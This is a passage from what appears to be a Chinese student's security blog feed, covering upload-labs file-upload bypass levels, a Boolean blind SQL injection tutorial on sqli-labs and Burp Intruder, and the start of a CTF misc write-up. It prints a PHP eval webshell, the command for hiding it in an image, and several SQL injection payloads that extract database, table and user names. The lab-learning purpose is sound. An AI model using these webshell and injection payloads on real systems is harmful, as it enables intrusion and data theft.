src="https://img-blog.csdnimg.cn/20200511171014758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>试一下，这里我加个点，尝试点绕过。<br><img src="https://img-blog.csdnimg.cn/20200511171142217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后复制图像地址看一下。<br><img src="https://img-blog.csdnimg.cn/20200511171524604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>再看看upload的文件夹<br><img src="https://img-blog.csdnimg.cn/20200511171328208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这里知道它是将php替换成”空格”了。<br>嗯，这里可以进行双写绕过……<br><img src="https://img-blog.csdnimg.cn/20200511171753880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>测试连接，连接成功<br><img src="https://img-blog.csdnimg.cn/20200511171839344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="Pass-12-00截断Get"><a href="#Pass-12-00截断Get" class="headerlink" title="Pass-12 %00截断Get"></a>Pass-12 %00截断Get</h2><p><img src="https://img-blog.csdnimg.cn/20200511174326316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>代码解析;<br>这个是对服务器端上传文件名的后缀做了限制，<br>这里没有设置黑名单，而是白名单，规定只能上传jpg/png/gif格式的图片。<br><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>可知上传路径命名规则使用用户get请求的save_path值拼接而成。<br>可以考虑%00截断，但是好像php%00截断只对php版本&lt;5.3的适用，我的是5.4，不知道行不行，试一下吧。<br>抓包进行修改。<br><img src="https://img-blog.csdnimg.cn/20200511175244701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>果然不行，上传出错了。<br><img src="https://img-blog.csdnimg.cn/2020051117533873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>切换到5.3的版本应该就行了。</p><h2 id="Pass-13-00截断POST"><a href="#Pass-13-00截断POST" class="headerlink" title="Pass-13 00截断POST"></a>Pass-13 00截断POST</h2><p>查看源码发现是基于post的save_path，做题如何判断是get还是post，抓包查看save_path在什么位置，在上面的url的位置上就是get，如下的情况就是post。<br><img src="https://img-blog.csdnimg.cn/20200511182305466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>修改，因为是post方式，它与get方式不同的就是，它不会对%00自动进行解码，所以在二进制中修改。<br><img src="https://img-blog.csdnimg.cn/20200511182409426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/2020051118260279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>测试连接，可以连上。<br><img src="https://img-blog.csdnimg.cn/20200511182855402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="Pass-14图片马"><a href="#Pass-14图片马" class="headerlink" title="Pass-14图片马"></a>Pass-14图片马</h2><p><img src="https://img-blog.csdnimg.cn/20200512090543515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>制作图片shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF98A</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后改为图片格式的后缀。<br>上传……<br><img src="https://img-blog.csdnimg.cn/20200512093100951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后，提示有文件包含漏洞，可以查看一下。<br><img src="https://img-blog.csdnimg.cn/20200512093153787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>关于文件包含漏洞，之前学习上传图片马，然后了解了一下文件包含漏洞，具体学习的博客正在写了，完善完成后发。<br>这里直接利用。<br>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;include.php?file&#x3D;4420200512095517.gif</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051209391194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>访问，可以。<br>尝试蚁剑连接。<br><img src="https://img-blog.csdnimg.cn/20200512094009859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>终于成功了，get。<br>注意事项：<code>include.php</code>必须在upload目录下，或者这么说：<code>include.php</code>必须和上传的文件(图片马)在同一目录下。</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>继续上传刚才的图片马(上一关上传的我已经删除了)<br>成功了，测试连接，也可以<br><img src="https://img-blog.csdnimg.cn/20200512095949200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这关是，用getimagesize函数判断文件类型图片马没什么影响。可以使用。</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>已久传了我百传不厌的“图片”，发现依旧管用。<br><img src="https://img-blog.csdnimg.cn/20200512101250421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看源码：<br><img src="https://img-blog.csdnimg.cn/20200512101819686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看后发现我已经是开着这个模块的。所以才成功了，<br>考点：使用php_exif模块来判断文件类型，已久可以使用图片马。</p><h2 id="Pass-17二次渲染"><a href="#Pass-17二次渲染" class="headerlink" title="Pass-17二次渲染"></a>Pass-17二次渲染</h2><p>这一关有所变化，<img src="https://img-blog.csdnimg.cn/20200512102044331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这个图片马不管用了，那就再换一个。<br>之前记得学过将php一句话与正常图片拼接成一个图片马。在硬盘角落里找到了它。<br>还是再写一遍制作方法：使用windows命令中的copy</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b+shell.php/a <span class="number">1000</span>.jpg</span><br></pre></td></tr></table></figure><p>就可以生成图片马了。<br>上传……<br><img src="https://img-blog.csdnimg.cn/20200512102547291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后发现找不到我的一句话了。<br><img src="https://img-blog.csdnimg.cn/20200512105346939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>按理说，我的一句话应该是在这里的，不见了。查过资料发现是进行了二次渲染。<br>查看源码：<br><img src="https://img-blog.csdnimg.cn/20200512105528292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>上面还进行了判断content-type还有后缀等。二次渲染不知道怎么绕过。看看大佬的文章，没有随便转载和复现，感觉大佬写的很详细，下次再看直接去看原创。留个门：<a href="https://xz.aliyun.com/t/2657#toc-13">传送门</a><br>php一句话被写在了中间的位置，也不是随便挑的位置。有方法去写的。</p><p>到此先停下，这个二次渲染已经不会了，后面的也先不看了。看不定还浪费时间。等水平提高一点了再把这个靶场过完。</p><p>文末寄语：</p><blockquote><p>有时想想，独居斗室和天涯浪迹好像是一件事情，身处寂寞和身处喧嚣其实也没什么两样，身外的整个世界都是镜子，我们必须自己认得自己。<br> ——马良《人间卧底》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是布尔盲注？学到了</title>
      <link href="/2020/08/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9F%E5%AD%A6%E5%88%B0%E4%BA%86/"/>
      <url>/2020/08/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9F%E5%AD%A6%E5%88%B0%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>周一晚上学长给我们讲了布尔盲注。</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注为什么叫布尔盲注，看下概念</p><blockquote><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。</p></blockquote><blockquote><p>基于布尔的盲注<br>Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。</p></blockquote><p>明白了，True和False都是布尔类型，这个在Python里会经常用到。<br>1.布尔盲注利用前提：<br>页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入<br>缺点：速度太慢，消耗大量时间<br>2.布尔盲注常用函数：<br>length（）函数 返回字符串的长度<br>ascii( )函数<br>作用：返回字符串str的字符ASCII码值。如果str是空字符串，返回0.如果string是 NULL,返回NULL。<br>substr()函数 用来截取字符串，其中有三个参数，可以自定义要截取的字符串，截取的起点位置和截取的长度。<br>基本概念就说这么多，下面开始实战试试</p><h4 id="The-fifth"><a href="#The-fifth" class="headerlink" title="The fifth"></a>The fifth</h4><p>我看到有好几种方法，手工型盲注的，借助工具的等等。这里我都列举下来。<br><strong>手工注入：</strong><br>第一步不变，照样是判断闭合符号</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020030313233131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>根据这里的报错，判断应该是单引号闭合<br><img src="https://img-blog.csdnimg.cn/20200303132452144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>果然是对的，页面返回了<code>You are in……</code>代表True，如果没有回显就是False。<br>第二步：<br>判断列数</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200303210636541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>只有三列，还跟之前一样。第四页就没有了。可以自己试一下。这里不再放图了。<br>第三步：<br>判断库名的长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200303205632827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个就是猜它的库名长度。别问为什么是8。<br>第四步：<br>手工注入时可使用例如<code>left((select database()),1)&lt;&#39;t&#39;</code>  这样的比较二分查找方法快速爆破,开始爆库</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200303204220542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>解读下这个句子，<code>left((select database()),1)</code>意思是数据库的名字从左边数的第一位，上面那个就是判断该数据库的名字第一个字母是不是s，我giao肯定有人不明白为什么要让它等于s，我一开始也不懂，直说吧，我也不是猜的，我是试出来的<br><img src="https://img-blog.csdnimg.cn/20200303203939828.jpg" alt="在这里插入图片描述" loading="lazy"><br>不过也不是挨个的傻不拉几的去试，二分法就很好，能减少“工作量”，二分法不明白百度看看吧，<br>想到这里我就莫名的想笑，有工具不用，非纠结个这，废了我好长时间。<br><img src="https://img-blog.csdnimg.cn/20200303204430292.jpg" alt="在这里插入图片描述" loading="lazy"><br>接着试，这个布尔盲注就是一个机器人，只会说是或者不是，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and right((select database()),1)=&#x27;y&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200303204857876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>事实证明这个可行，就是太费劲，贼费劲。对了，我当时看这个方法的时候，还有一个想法就是，我能不能把这个1换成其他数字，我原本以为它能换，我试了一下，发现不行！！！！！！可能是我的打开方式不对，总之这个是能打开的，我当时的错的操作步骤我忘了，现在，我可以肯定的说，可以。这个手注方法，是我看一个大佬的博客学的，看的很懵逼，因为这位大佬，他没有多加解释，我这种学习CTF两天半的小白看起来很费劲，有好多不理解的地方，有好多为什么想问，我经过好多次的尝试，算是明白啦怎么操作这个语句。一起看下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select database()),2)=&#x27;se&#x27; --+</span><br></pre></td></tr></table></figure><p>如果这样回显是正确的。其他的自行拓展。<br>手注终究是太麻烦了，理解原理就够了，实际做题应该用不上。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p>limit x,1值得是可以吧x换成其他值，而这个其他值也不是随便改的，最大不能超过你用order by 查出来的那个列数。<br>疑惑点也解决了，接下来就不详细说了。步骤就都是这样的。</p><h5 id="借助工具注入"><a href="#借助工具注入" class="headerlink" title="借助工具注入"></a>借助工具注入</h5><p>这个都喜欢，嘿嘿，用burp进行盲注<br>这个不知道为什么，我的工具抓不到sqli-labs网站的包，总是抓到一些其他的网站，我也是无语了。就试试其他的题。<br>先随意写账户密码，抓包。<br><img src="https://img-blog.csdnimg.cn/20200308125414988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>抓到包之后，看到了usename<br>测试闭合符号<br>右键单击，选择<code>Send to Repeater</code><br>1.单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span><span class="string">&#x27; or 1=1--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308130216649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>单引号错误，继续试双引号<br><img src="https://img-blog.csdnimg.cn/20200308130607695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>对了，但是没有flag，也是，如果有的话，那就变成万能密码了！！！<br>数据库<br>上面可以证明闭合符号是双引号，<br>先测试数据库名的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span><span class="string">&quot; or length(database())&gt;1--+&amp;password=1234</span></span><br></pre></td></tr></table></figure><p>试试其他的，盲注的话，最好用二分法，再试试10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span><span class="string">&quot; or length(database())&gt;10--+&amp;password=1234</span></span><br></pre></td></tr></table></figure><p>然后就错了，这个证明没有10大，再试试等于10的情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span><span class="string">&quot; or length(database())=10--+&amp;password=1234</span></span><br></pre></td></tr></table></figure><p>对了，然后就可以爆库名了<br>右键单击空白然后<code>Send to intruder</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span><span class="string">&quot; or (ord(substr(database(),§num1§,1))=§num2§)--+ &amp;password=1234</span></span><br></pre></td></tr></table></figure><p>两个变量，这里<code>Attack type</code>选择第四个，<code>Cluster bomb</code><br>去到Payload页面：<br>Payload set :1<br>payload type:Number类型<br>from：1<br>To：10<br>Step：1<br>第二个类似，from：0<br>To ：127（因为ASCII码表127个）<br>step：1<br><img src="https://img-blog.csdnimg.cn/2020030813411447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>回到Positions页面点击<code>Start attack</code><br>结果如下：选择<code>length</code>点击两次就会出现下图的样子<br><img src="https://img-blog.csdnimg.cn/20200308140654903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里百度搜索ASCII码在线转换工具，将这些ASCII码值转换成字母<a href="https://www.mokuge.com/tool/asciito16/">点击直接跳到ASCII码在线转换工具</a><br>解码后，得到的值是<code>challenges</code><br>下一步：爆表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span><span class="string">&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§num1§,1)))=§num2§ --+ &amp;password=</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308200619549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>转换成字母就是<code>user_1</code><br>爆列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span><span class="string">&quot; or (ascii(substr((select username from user_1 limit 0,1),§num1§,1)))=§num2§--+ &amp;password=</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308204007101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>转换后：<code>qwzf</code>👀学长名字😂<br>改变limit参数，爆出第二列<br><img src="https://img-blog.csdnimg.cn/20200308204629312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>转换后：<code>lemon</code>又一个，好想明白点什么。嘿嘿！<br>接着爆，因为flag在数据库里<br><img src="https://img-blog.csdnimg.cn/20200308205645349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>又一个，转换后：<code>admin</code><br>看还有没了，好像没了。what？？？flag哪去了？？？<br>那先爆值看看吧。<br><img src="https://img-blog.csdnimg.cn/20200308211335375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>呃呃呃呃呃…………………………………………<br>这是啥？？？？<img src="https://img-blog.csdnimg.cn/20200308211814217.jpg" alt="在这里插入图片描述" loading="lazy"><br>这么多，，，，很可能就是flag了。看一下是啥。<br>SL{1_@m_B001_Bl1nd_inje4t}出来了，我还犯了个眼瞎的错误，害，不说了，总之又丢人了。<br><img src="https://img-blog.csdnimg.cn/20200308213056865.jpg" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记——小记</title>
      <link href="/2020/08/23/%E5%B9%B3%E6%97%B6%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2020/08/23/%E5%B9%B3%E6%97%B6%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h2><p><img src="https://img-blog.csdnimg.cn/20200420093151978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下载图片后，很大的一张图片，里面必定有东西，foremost分离<br>得到压缩包。<br>解压后是一张jpg格式的图片，但是打不开，猜想应该可能会是文件头缺少，打开010Editor，看一下，发现有点不对劲，<br><img src="https://img-blog.csdnimg.cn/20200420093522647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>好像是个avi文件，改后缀。打开是一个小视频，好像看过，钉钉来着，全程在叫baba哈。看到中间有几张带二维码的图片闪过去了。太快看不清，用放在PR里逐帧分离，用截图工具Snipaste截取二维码QQ截图也行，（注意截图时，不要截到其他部分，否则修复二维码时会出现解码失败的现象）。<br>放在扫描工具里修复二维码并扫码<br><img src="https://img-blog.csdnimg.cn/20200420095011108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>全部扫出来，得到字符串，观察发现符合base16编码的特征。于是进行base16解码<br><img src="https://img-blog.csdnimg.cn/20200420095146619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个答案好奇怪，栅栏也不是啊。难道是什么新的加密？看看比赛时给的wp，<br><img src="https://img-blog.csdnimg.cn/20200420095846458.png" alt="Augenstern" loading="lazy"><br>呃呃呃，是这样吗？？？？？？<br>flag：BJD{imagin_love_Y1ng}</p><h2 id="安恒月赛——6G还会远吗"><a href="#安恒月赛——6G还会远吗" class="headerlink" title="安恒月赛——6G还会远吗"></a>安恒月赛——6G还会远吗</h2><p>题目链接：<a href="http://server.zhaoj.in:8888/1GTest.file">http://server.zhaoj.in:8888/1GTest.file</a><br><img src="https://img-blog.csdnimg.cn/20200505160031618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" 